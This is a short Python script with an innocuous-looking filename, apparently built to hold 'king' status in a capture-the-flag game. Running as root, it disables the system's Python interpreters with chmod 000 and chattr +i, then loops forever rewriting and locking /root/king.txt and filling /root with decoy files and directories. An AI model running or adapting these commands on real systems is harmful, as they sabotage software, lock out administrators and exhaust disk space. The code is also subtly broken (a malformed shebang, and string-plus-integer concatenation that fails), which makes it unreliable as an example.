#/usr/bin/python
#name --> docbook-xsl.py

import os
#vars
king = "/root/king.txt"
i = 0
#python take care
os.system("chmod 000 /usr/bin/python")
os.system("chmod 000 /usr/bin/python3")
os.system("chattr +i /usr/bin/python")
os.system("chattr +i /usr/bin/python3")

#king.txt
while 1:
#keep  king
    os.system("chattr -i "+king)
    os.system("echo 'cultholmes'>"+king)
    os.system("chmod 000 "+king)
    os.system("chattr +i "+king)
#give false positives
    os.system("cd /root;touch king"+i+".txt;echo 'sorry kiddo:)'>king"+i+".txt;chattr +i king"+i+".txt");i+=1
    os.system("mkdir /root/kiddo"+i);i+=1
